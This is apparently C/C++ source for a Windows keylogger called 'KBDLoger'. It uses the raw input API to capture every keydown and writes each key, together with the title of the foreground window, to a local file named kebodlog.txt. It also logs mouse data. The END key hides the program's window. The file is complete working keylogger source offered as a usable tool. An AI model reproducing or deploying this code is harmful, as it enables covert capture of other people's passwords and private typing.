//#include "rawinput.h"
#include <Windows.h>
#include "vkey.h"
#include "resource.h"


BOOL RegisitKeyBord(HWND hwnd);
PVOID GetApiAdd(LPCSTR dllname, LPCSTR procname);
typedef
UINT
(_stdcall * PGetRawInputData)(
    HRAWINPUT hRawInput,
    UINT uiCommand,
    LPVOID pData,
    PUINT pcbSize,
    UINT cbSizeHeader
);

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
HANDLE InitLogFile(void);
HANDLE hFile;
char *szHelpInfo = "键盘记录于kebodlog.txt中 -- 按HOME键显示本窗口,END键隐藏本窗口";

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, PSTR, INT iCmdShow)
{
   HWND                hWnd;
   MSG                 msg;
   WNDCLASS            wndClass;

   wndClass.style          = CS_HREDRAW | CS_VREDRAW;
   wndClass.lpfnWndProc    = WndProc;
   wndClass.cbClsExtra     = 0;
   wndClass.cbWndExtra     = 0;
   wndClass.hInstance      = hInstance;
   wndClass.hIcon          = LoadIcon(NULL, IDI_APPLICATION);
   wndClass.hCursor        = LoadCursor(NULL, IDC_ARROW);
   wndClass.hbrBackground  = (HBRUSH)GetStockObject(WHITE_BRUSH);
   wndClass.lpszMenuName   = NULL;
   wndClass.lpszClassName  = TEXT("KBDLoger");
   RegisterClass(&wndClass);
   
   
   hWnd = CreateWindow(
      TEXT("KBDLoger"),   // window class name
      TEXT("KBDLoger"),  // window caption
      WS_OVERLAPPEDWINDOW,      // window style
      200,            // initial x position
      200,            // initial y position
      480,            // initial x size
      110,            // initial y size
      NULL,                     // parent window handle
      NULL,                     // window menu handle
      hInstance,                // program instance handle
      NULL);                    // creation parameters

   SendMessage(hWnd,WM_SETICON,ICON_BIG,(LPARAM)LoadIcon((HINSTANCE)GetWindowLong(hWnd,GWL_HINSTANCE),MAKEINTRESOURCE(IDI_ICON1)));
   SendMessage(hWnd,WM_SETICON,ICON_SMALL,(LPARAM)LoadIcon((HINSTANCE)GetWindowLong(hWnd,GWL_HINSTANCE),MAKEINTRESOURCE(IDI_ICON1)));
	
   hFile = InitLogFile();

   if(!RegisitKeyBord(hWnd))
   {
	   MessageBox(hWnd, "注册键盘原始输入设备失败", "Raw Input Test", 0);
	   return 0;
   }
	  
   ShowWindow(hWnd, SW_NORMAL);
   UpdateWindow(hWnd);
   
   while(GetMessage(&msg, NULL, 0, 0))
   {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
   }
   
   return msg.wParam;
}  // WinMain

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
   HDC          hdc;
   PAINTSTRUCT  ps;
   
   char vk[256] = {'\0'};
   HWND hwndCW = NULL;
   char wtitle[128] = {'\0'};

   UINT dwSize;
   PGetRawInputData GetRawInputData = (PGetRawInputData)GetApiAdd("user32.dll", "GetRawInputData");
   LPBYTE lpb = NULL;
   RAWINPUT* raw = NULL;
   DWORD dwWritten = 0;
  
   switch(message)
   {
   case WM_INPUT:
	   if(NULL == GetRawInputData)
	   {
		   DefWindowProc(hWnd, message, wParam, lParam);
		   return 0;
	   } 	   
	   GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
	   lpb = new BYTE[dwSize];
	   if(lpb == NULL) 
	   {
		   DefWindowProc(hWnd, message, wParam, lParam);
		   return 0;
	   } 
	   
	   if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize)
		   MessageBox(NULL, "GetRawInputData doesn't return correct size !", "Raw Input Test", 0); 
	   
	   raw = (RAWINPUT*)lpb;
	   
	   if (raw->header.dwType == RIM_TYPEKEYBOARD) 
	   {
		    // 获取当前键盘焦点窗口名称
			hwndCW = GetForegroundWindow();
			GetWindowText(hwndCW, wtitle, 128);

		    wsprintf(vk, "[%s - 0x%X]:%s\r\n", wtitle, hwndCW, GetKeyName(raw->data.keyboard.VKey));
			if(hFile != INVALID_HANDLE_VALUE && ((WM_KEYDOWN == raw->data.keyboard.Message) || (WM_SYSKEYDOWN == raw->data.keyboard.Message)) && (0xFF !=raw->data.keyboard.VKey))
			{
			    SetFilePointer(hFile, 0, NULL, FILE_END);
				WriteFile(hFile, vk, strlen(vk), &dwWritten, NULL);
				OutputDebugString(vk);
			}
			if( VK_HOME == raw->data.keyboard.VKey)
				ShowWindow(hWnd, SW_NORMAL);
			if( VK_END == raw->data.keyboard.VKey)
				ShowWindow(hWnd, SW_HIDE);
	   }
	   else if (raw->header.dwType == RIM_TYPEMOUSE)
	   {
		   wsprintf(vk, TEXT("Mouse: usFlags=%04x ulButtons=%04x usButtonFlags=%04x usButtonData=%04x ulRawButtons=%04x lLastX=%04x lLastY=%04x ulExtraInformation=%04x\r\n"), 
			   raw->data.mouse.usFlags, 
			   raw->data.mouse.ulButtons, 
			   raw->data.mouse.usButtonFlags, 
			   raw->data.mouse.usButtonData, 
			   raw->data.mouse.ulRawButtons, 
			   raw->data.mouse.lLastX, 
			   raw->data.mouse.lLastY, 
			   raw->data.mouse.ulExtraInformation);
		   
			OutputDebugString(vk);
	   }
	   delete[] lpb; 
	   DefWindowProc(hWnd, message, wParam, lParam);
	   return 0;
   case WM_PAINT:
      hdc = BeginPaint(hWnd, &ps);
	  TextOut(hdc, 10, 10, szHelpInfo, strlen(szHelpInfo));
	  EndPaint(hWnd, &ps);
      return 0;
   case WM_DESTROY:
      PostQuitMessage(0);
	  CloseHandle(hFile);
      return 0;
   default:
      return DefWindowProc(hWnd, message, wParam, lParam);
   }
} // WndProc

HANDLE InitLogFile(void)
{
	HANDLE hFile = CreateFile("kebodlog.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	return hFile;
}
